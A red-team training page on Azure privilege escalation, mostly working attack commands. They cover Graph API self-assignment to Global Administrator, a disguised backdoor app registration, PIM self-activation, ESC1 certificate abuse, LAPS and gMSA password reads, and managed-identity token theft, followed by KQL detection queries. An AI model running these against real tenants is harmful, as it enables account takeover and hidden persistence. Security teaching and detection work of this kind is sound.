---
layout: training-page
title: "Azure Privilege Escalation — Red Team Academy"
module: "Active Directory"
tags:
  - azure-ad
  - privilege-escalation
  - graph-api
  - pim
  - entra-id
  - role-assignment
page_key: "ad-azure-privilege-escalation"
render_with_liquid: false
---

# Azure Privilege Escalation

Azure privilege escalation targets misconfigured RBAC roles, excessive Graph API permissions, Privileged Identity Management (PIM) misconfigurations, and over-permissioned service principals. The goal is to elevate from a low-privilege Azure identity to Global Administrator or subscription Owner.

## Azure RBAC Overview

Azure has two permission models that are often confused:

| Model | Scope | Permissions |
|-------|-------|-------------|
| **Azure RBAC** | Subscriptions, Resource Groups, Resources | Owner, Contributor, Reader, custom roles |
| **Azure AD Roles** | Directory (tenant-wide) | Global Admin, Privileged Role Admin, etc. |
| **Microsoft Graph permissions** | API access | Delegated or Application permissions |

Escalation paths exist within each model and across them — an Azure RBAC Owner can often pivot to Azure AD control.

---

## Graph API Privilege Escalation

### High-Risk Graph Application Permissions

If your service principal or app has any of the following **application permissions** (not delegated), you can escalate without user interaction:

| Permission | Escalation Capability |
|------------|----------------------|
| `RoleManagement.ReadWrite.Directory` | Add Global Admin, assign any role |
| `Directory.ReadWrite.All` | Modify all objects in directory |
| `AppRoleAssignment.ReadWrite.All` | Grant any permission to any app |
| `GroupMember.ReadWrite.All` | Add self to any group (including admin groups) |
| `User.ReadWrite.All` | Reset passwords, modify any user |
| `Application.ReadWrite.All` | Add credentials to any app registration |

### Escalating to Global Admin via Role Assignment

```bash
TOKEN="<access_token_with_RoleManagement.ReadWrite>"

# Step 1: Get the Global Administrator role object ID
curl -H "Authorization: Bearer $TOKEN" \
     "https://graph.microsoft.com/v1.0/directoryRoles?\$filter=displayName eq 'Global Administrator'" \
     | jq '.value[0].id'

# Step 2: Get your user or service principal object ID
curl -H "Authorization: Bearer $TOKEN" \
     "https://graph.microsoft.com/v1.0/me" | jq '.id'

# Step 3: Add yourself to Global Administrator role
curl -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/<your-object-id>"}' \
     "https://graph.microsoft.com/v1.0/directoryRoles/<global-admin-role-id>/members/\$ref"
```

### Creating a Backdoor App Registration with Admin Permissions

```bash
# Step 1: Create a new malicious app registration
curl -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"displayName": "Azure Backup Service"}' \
     "https://graph.microsoft.com/v1.0/applications" | jq '{appId, id}'

# Step 2: Create a service principal for the app
curl -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"appId": "<new_app_id>"}' \
     "https://graph.microsoft.com/v1.0/servicePrincipals"

# Step 3: Add a password credential to the app (backdoor secret)
curl -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"passwordCredential": {"displayName": "backup-cred"}}' \
     "https://graph.microsoft.com/v1.0/applications/<app-object-id>/addPassword"
# Returns the plaintext secret — store it immediately

# Step 4: Grant Directory.ReadWrite.All to the new app
# First get the Microsoft Graph SP ID in the tenant
curl -H "Authorization: Bearer $TOKEN" \
     "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '00000003-0000-0000-c000-000000000000'" \
     | jq '.value[0].id'

# Grant app role (Directory.ReadWrite.All = 19dbc75e-c2e2-444c-a770-ec69d8559fc7)
curl -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "principalId": "<new_sp_object_id>",
       "resourceId": "<graph_sp_id>",
       "appRoleId": "19dbc75e-c2e2-444c-a770-ec69d8559fc7"
     }' \
     "https://graph.microsoft.com/v1.0/servicePrincipals/<new_sp_id>/appRoleAssignments"
```

### Azure CLI RBAC Escalation

```bash
# If you have Contributor or Owner on a subscription/resource group
# Check current role assignments
az role assignment list --include-inherited --query "[].{role:roleDefinitionName, principal:principalName}"

# Assign Owner role to yourself on a subscription
az role assignment create \
    --assignee "<your-object-id>" \
    --role "Owner" \
    --scope "/subscriptions/<subscription-id>"

# Assign Owner on a specific resource group
az role assignment create \
    --assignee "<your-object-id>" \
    --role "Owner" \
    --scope "/subscriptions/<sub-id>/resourceGroups/<rg-name>"
```

---

## Azure AD PIM Abuse

Privileged Identity Management (PIM) implements Just-In-Time (JIT) role access — users hold **eligible** roles that they must explicitly activate. PIM misconfigurations allow direct role activation or bypass.

### PIM Concepts

| Term | Meaning |
|------|---------|
| **Eligible role** | User can activate the role on demand |
| **Active role** | User currently has the role |
| **Activation** | Process of converting eligible → active (may require MFA, approval, justification) |
| **Permanent active** | Role is always active (no JIT, high risk) |

### Enumerating PIM Eligible Roles

```
Import-Module .\AADInternals.ps1

# List all PIM eligible role assignments for the current user
$token = Get-AADIntAccessTokenForMSGraph
Invoke-MSGraphRequest -Token $token -Endpoint "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleRequests"

# Via Graph API
curl -H "Authorization: Bearer $TOKEN" \
     "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleInstances" \
     | jq '.value[] | {roleName: .roleDefinition.displayName, user: .principal.userPrincipalName}'
```

### Activating PIM Role via Graph API (No Portal Required)

If you compromise a user with an eligible role and PIM activation doesn't require approval:

```bash
# Activate eligible Global Administrator role for current user
curl -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "action": "selfActivate",
       "principalId": "<your-user-object-id>",
       "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
       "directoryScopeId": "/",
       "justification": "Required for system maintenance",
       "scheduleInfo": {
         "startDateTime": "2026-04-06T00:00:00Z",
         "expiration": {
           "type": "afterDuration",
           "duration": "PT8H"
         }
       }
     }' \
     "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests"
```

### Assigning PIM Eligible Roles (If Privileged Role Admin)

```bash
# Make a user eligible for Global Admin via PIM
curl -X POST \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "action": "adminAssign",
       "principalId": "<target-user-object-id>",
       "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
       "directoryScopeId": "/",
       "scheduleInfo": {
         "startDateTime": "2026-04-06T00:00:00Z",
         "expiration": {
           "type": "noExpiration"
         }
       }
     }' \
     "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleRequests"
```

### PIM Bypass Techniques

1. **Activate without approval**: If PIM policy doesn't require approver, activation is instant
2. **Eligible role in excluded group**: If an excluded CA policy group contains the eligible role user
3. **Emergency access accounts**: Break-glass accounts may bypass PIM — find them and target
4. **Legacy activation endpoint**: Older `MSOnline` module may bypass some PIM controls

---

## From Global Reader to Owner

Global Reader is frequently granted as a "safe" read-only role, but it exposes enough information to build attack chains:

```
# With Global Reader: enumerate all permissions and configurations
# Find: users with weak passwords (spraying targets)
# Find: apps with excess permissions (lateral to higher privilege)
# Find: automation accounts with MSI (potential privesc)
# Find: DevOps pipelines with service connections (code execution)

# Escalation path:
# Global Reader → find poorly scoped SP with Directory.ReadWrite.All
# Compromise SP credentials → use Directory.ReadWrite.All to assign Global Admin
```

---

## Active Directory Certificate Services in Azure

ADCS (AD CS) Escalation paths work in hybrid environments where ADCS is linked to Azure AD.

### ESC1 — Abusing SAN in Certificate Templates

```
# From on-prem: request cert with arbitrary SAN (alternative UPN)
# Use Certify to find vulnerable templates
.\Certify.exe find /vulnerable

# Request cert with Global Admin UPN as SAN
.\Certify.exe request /ca:"CA-Server\CA-Name" /template:"UserCert" /altname:"globaladmin@victim.com"

# Use Rubeus to convert to PFX and authenticate to Azure
.\Rubeus.exe asktgt /user:globaladmin@victim.com /certificate:<base64_cert>

# Pass the cert to Azure via AADInternals
Get-AADIntAccessTokenForAADGraph -Certificate (Get-PfxCertificate ".\cert.pfx")
```

### LAPS and gMSA Misconfiguration

```powershell
# Find LAPS-protected computers where you can read the password
# (requires GenericRead/AllExtendedRights on computer objects)
Import-Module .\PowerView.ps1
Get-DomainComputer -Filter {ms-Mcs-AdmPwd -ne $null} | Select Name, ms-Mcs-AdmPwd

# Alternatively via LAPSToolkit
Find-LAPSDelegatedGroups  # Groups with read access to LAPS passwords
Get-LAPSComputers          # Computers with LAPS enabled

# gMSA password retrieval (if authorized)
$gmsa = Get-ADServiceAccount -Identity "svc-account" -Properties msDS-ManagedPassword
$gmsa.'msDS-ManagedPassword' | ConvertTo-NTHash
```

---

## Escalation via Managed Identity

Azure resources with Managed Identities (MSI) can authenticate to other Azure services without credentials stored anywhere. Compromising a resource with MSI grants its identity's permissions.

```bash
# From inside an Azure VM with MSI enabled — get MSI token
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
     -H "Metadata: true"

# The returned token has the VM's MSI permissions
# Check what RBAC roles the MSI has
az role assignment list --assignee "<msi-object-id>" --include-inherited

# Use MSI token with Graph API if Graph permissions were granted
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/' \
     -H "Metadata: true"
```

---

## Detection — KQL Queries

```
// Detect new role assignment creation
AuditLogs
| where OperationName == "Add member to role"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, 
          TargetResources[0].displayName, TargetResources[1].displayName

// Detect PIM role activation
AuditLogs
| where OperationName contains "eligible role assignment"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, 
          TargetResources[0].displayName

// Detect new app role grant (application permission)
AuditLogs
| where OperationName == "Add app role assignment to service principal"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, 
          TargetResources[0].displayName, AdditionalDetails

// Detect new service principal credential added (backdoor)
AuditLogs
| where OperationName == "Add service principal credentials"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, 
          TargetResources[0].displayName
```

## Resources

- AADInternals — `github.com/Gerenios/AADInternals`
- Azure RBAC built-in roles — `learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles`
- Microsoft Graph permissions reference — `learn.microsoft.com/en-us/graph/permissions-reference`
- PIM documentation — `learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/`
- Certify (ADCS) — `github.com/GhostPack/Certify`
- LAPSToolkit — `github.com/leoloobeek/LAPSToolkit`
